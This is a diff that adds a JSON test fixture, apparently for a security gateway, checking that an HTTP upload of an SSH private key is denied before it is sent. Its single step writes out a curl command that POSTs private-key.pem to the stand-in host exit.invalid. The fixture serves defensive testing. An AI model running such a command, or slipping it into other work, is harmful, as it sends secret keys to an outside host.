@@ -1,0 +1,57 @@
+{
+  "pack_id": "egress-http-private-key-exfil",
+  "title": "HTTP private key exfiltration is denied before send",
+  "attack_family": "data_exfiltration",
+  "public_tier": "public_core",
+  "runtime_family": "shell",
+  "artifact_type": "shell_installer",
+  "artifact": {
+    "ecosystem": "archive",
+    "source": "http://exit.invalid/private-key",
+    "requested_selector": "egress",
+    "selector_kind": "url"
+  },
+  "incident_refs": ["pypi/litellm-telnyx-2026-04-02"],
+  "technique_refs": ["http-post", "private-key-exfiltration"],
+  "control_pair_id": "control-benign-egress-clean-upload",
+  "confidence_policy": "hard_ban",
+  "allowed_baseline_signals": [],
+  "required_personas": ["developer_workstation"],
+  "required_scenarios": [
+    { "name": "http_private_key", "detonation": "cli_smoke", "phase": "cli" }
+  ],
+  "suite_tags": ["egress", "public_core"],
+  "execution": {
+    "browser_required": false,
+    "vm_required": false,
+    "queue_required": false,
+    "runner_mode": "fixture_only"
+  },
+  "expected_node_decision": "denied_before_send",
+  "expected_verdict": { "verdict": "malicious" },
+  "expected_tripwires": { "required": ["private_key_egress_denied"], "allowed_false_positives": [] },
+  "control_expectations": { "require_clean_verdict": true, "max_shared_tripwires": 0, "notes": [] },
+  "evidence_minimums": {
+    "require_captured_request": true,
+    "require_quarantine_job": false,
+    "require_lab_run": false,
+    "require_evidence_bundle": true,
+    "require_feed_visibility": true,
+    "require_browser_trace": false
+  },
+  "timing": { "max_queue_latency_ms": 500, "max_detonation_startup_ms": 500, "max_verdict_completion_ms": 500 },
+  "files": ["payload.txt"],
+  "steps": [
+    {
+      "step_id": "deny_http_private_key",
+      "detail": "governed HTTP upload containing an SSH private key is denied before forwarding",
+      "phase": "cli",
+      "process_lineage": ["gateway", "curl"],
+      "command": "curl --proxy http://zitpit-gateway:3004 -X POST --data-binary @private-key.pem http://exit.invalid/upload",
+      "network_target": "exit.invalid",
+      "network_protocol": "http",
+      "tripwire": "private_key_egress_denied",
+      "severity": "critical"
+    }
+  ]
+}
